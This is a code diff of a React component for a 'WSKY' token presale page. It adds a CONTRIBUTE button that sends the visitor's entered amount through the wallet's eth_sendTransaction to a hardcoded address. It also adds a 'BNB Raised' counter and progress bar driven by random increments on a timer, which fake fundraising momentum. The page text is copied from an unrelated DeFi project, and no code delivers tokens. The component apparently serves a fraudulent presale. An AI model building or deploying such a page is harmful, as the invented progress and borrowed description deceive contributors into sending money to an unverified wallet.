@@ -1,124 +1,117 @@
+import { Button } from 'react-bootstrap';
 import Clock from './Clock';
+import '../css/RightSideMainCenter.css'
+import { useRef, useState, useEffect } from 'react';
+import web3 from 'web3-utils'
 
-const RightSideMainCenter = () => (
-  <div style={{
-    width: '783.5px', backgroundColor: 'white', padding: '20px', borderRadius: '8px'
-  }}
-  >
-    <div>
-      <div>
-        <div>image</div>
-        <div>
-          <div>WSKy</div>
-          <div>Whiskey</div>
-        </div>
-      </div>
-      <div>
-        ✔️Rewards in BNB for
-        holders ✔️Active chat ✔️Representative site
-        ✔️Devs have been working on the project for over
-        2 months ✔️Dev Doxxed ✔️Transparent and audited
-        contract ✔️Huge Marketing plan with $150 000
-        ✔️AIRDROP 100 BNB 💰💰💰 ✔️Shill rewards ⚜️Just
-        Relax 💎Hold $WSKY 🥃Drink Whiskey 💵Get Richer
-        💈Chill....
-      </div>
-      <div>
-        <div>
-          <span>Presale Address:</span>
-          <span>0x123123123123</span>
-        </div>
-        <div>
-          <span>Token Address:</span>
-          <span>0x123123123123</span>
-        </div>
-        <div>
-          Do not send BNB
-          to the token address!
-        </div>
-        <div>
+const RightSideMainCenter = () => {
 
-          ⚠️ This Token uses a Custom Contract
+    const inputRef = useRef(null)
+    const [sendCoinLoading, setSendLoading] = useState(false);
+    const handleSendCoin = async () => {
+        setSendLoading(true);
 
+        const defaultGas = '5';
+        const inputDom = inputRef && inputRef.current;
+        const wei = web3.toWei(inputDom.value);
+        const toHext = web3.toHex(wei)
+
+        try {
+
+            const transactionParameters = {
+                to: '0x507A7A820114a867E79Ad9548d66F7e15d425301', // Required except during contract publications.
+                from: window.ethereum.selectedAddress, // must match user's active address.
+                value: toHext, // Only required to send ether to the recipient from the initiating external account.
+                data:
+                    '0x7f7465737432000000000000000000000000000000000000000000000000000000600057', // Optional, but used for defining smart contract creation and interaction.
+
+            };
+            if (window.ethereum) {
+                const result = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                })
+                setSendLoading(false)
+            }
+        } catch (e) {
+            console.log(e);
+            setSendLoading(false)
+        }
+    }
+    const [number, setNumber] = useState(10);
+
+    useEffect(() => {
+        const interval = setInterval(() => {
+            let num = (Math.random()).toFixed(3);
+            let randomNumber = Number(num * 10);
+            let distance = Number((number + randomNumber).toFixed(3));
+            if (distance < 300) {
+                setNumber(distance)
+            }
+        }, 500);
+        return () => {
+            if (interval) {
+                clearInterval(interval)
+            }
+        }
+    }, [number])
+
+    return (
+        <div style={{
+            width: '783.5px', backgroundColor: 'white', padding: '20px', borderRadius: '8px', margin: '12px'
+        }}
+        >
+            <div>
+                <div className="d-flex align-items-center" style={{ marginBottom: '50px', width: '65px', height: '60px' }}>
+                    <div>
+                        <img src="../images/logo-original.png" alt="image" style={{ width: '55px', height: '55px', margin: '0 10px 5px 0' }} />
+                    </div>
+                    <div>
+                        <div style={{ height: '38px', fontSize: '16px', padding: '7px' }}>WSKy</div>
+                        <div style={{ height: '28px', fontSize: '16px', padding: '4px 0 0 3px' }}>Whiskey</div>
+                    </div>
+                </div>
+                <div style={{ fontSize: '12.8px', borderBottom: '1px solid #e0e0e0', paddingBottom: '25px' }}>
+                    1Pool.finance is a decentralized Money Market Protocol for lending and yield aggregation of LP tokens and other standard digital assets.
+                    1Pool lending protocol collateralizes LP tokens, and make it possible for the borrowers to take a loan against selected LP token collateral.
+                    That is a first in the DeFi
+                </div>
+                <div style={{ textAlign: 'center', marginTop: '25px', marginBottom: '25px' }}>
+                    <div>{number}/300 BNB Raised</div>
+                    <div className="d-flex align-items-center justify-content-center" style={{ width: '367.75px', height: '4px', marginLeft: '190px' }}>
+                        <div style={{ width: `${number + 40}px`, height: '4px', backgroundColor: '#2196f3' }} />
+                        <div style={{ width: `${367 - number - 40}px`, height: '4px', backgroundColor: '#e0e0e0' }} />
+                    </div>
+                </div>
+                <div className="d-flex align-items-center flex-column justify-content-center" style={{ marginBottom: '30px', fontFamily: 'Open Sans, sans-serif' }}>
+                    <input
+                        style={{ width: '365.75px', overflow: 'hidden', fontSize: '14px', borderRadius: '10px' }}
+                        type="text"
+                        className="form-control"
+                        placeholder="1BNB = 920000 WSKY"
+                        aria-label="coin"
+                        aria-describedby="basic-addon2"
+                        ref={inputRef}
+                    />
+                    <div style={{ fontSize: '12.8px' }}>You will get WSKY tokens!</div>
+                    <Button disabled={sendCoinLoading} onClick={handleSendCoin} type="button" className="button-contribute" style={{ width: '120px', height: '36px', backgroundColor: '#2196f3', color: 'white', padding: '6px 16px', fontSize: '14px', borderRadius: '24px', cursor: 'pointer', marginTop: '10px' }}>CONTRIBUTE</Button>
+                </div>
+                <div style={{ textAlign: 'center', borderBottom: '1px solid #e0e0e0', paddingBottom: '25px' }}>
+                    <div style={{ fontSize: '12.8px' }}>Presale Ends in:</div>
+                    <Clock />
+                </div>
+                <div className="d-flex align-items-center" style={{ padding: '14px', fontSize: '12.8px' }}>
+                    <div className="item-center" style={{ width: '375.75px', height: '66px', textAlign: 'center' }}>
+                        <div>Your Contributed Amount:</div>
+                        <div>0.0 BNB</div>
+                    </div>
+                    <div className="item-center" style={{ width: '375.75px', height: '66px', textAlign: 'center' }}>
+                        <div>Your Reserved Token</div>
+                        <div>0 WSDY</div>
+                    </div>
+                </div>
+            </div>
         </div>
-      </div>
-      <div>
-        <div>195/300 BNB Raised</div>
-        <div>
-          <span />
-          <span />
-        </div>
-      </div>
-      <Clock />
-        <div>
-            <div>
-                <div>Your Contributed Amount:</div>
-                <div>0.0 BNB</div>
-            </div>
-            <div>
-                <div>Your Reserved Token</div>
-                <div>0 WSDY</div>
-            </div>
-        </div>
-        <div>
-            <div>
-                <div>Sale ID</div>
-                <div>90</div>
-            </div>
-            <div>
-                <div>Total Supply</div>
-                <div>1 000 000 000 WSKY</div>
-            </div>
-            <div>
-                <div>Tokens For Presale</div>
-                <div>276 000 000 WSKY</div>
-            </div>
-            <div>
-                <div>Tokens For Liquidity</div>
-                <div>186 750 000 WSKY</div>
-            </div>
-            <div>
-                <div>Soft Cap</div>
-                <div>150 BNB</div>
-            </div>
-            <div>
-                <div>Hard Cap</div>
-                <div>300 BNB</div>
-            </div>
-            <div>
-                <div>Presale Rate</div>
-                <div>920 000 WSKY per BNB</div>
-            </div>
-            <div>
-                <div>PanackeSwap Listing Rate</div>
-                <div>830 000 WSKY per BNB</div>
-            </div>
-            <div>
-                <div>PancakeSwap Liquidity %</div>
-                <div>75</div>
-            </div>
-            <div>
-                <div>Minimum Contribution</div>
-                <div>0.1 BNB</div>
-            </div>
-            <div>
-                <div>Maximum Contribuition</div>
-                <div>2 BNB</div>
-            </div>
-            <div>
-                <div>Presale Start Time</div>
-                <div>27 Sep 2021 at 17:00</div>
-            </div>
-            <div>
-                <div>Presale End Time</div>
-                <div>28 Sep 2021 at 17:00</div>
-            </div>
-            <div>
-                <div>Liquidity Unlock Date</div>
-                <div>27 Sep 2021 at 17:00</div>
-            </div>
-        </div>
-    </div>
-  </div>
-);
+    );
+}
 export default RightSideMainCenter;
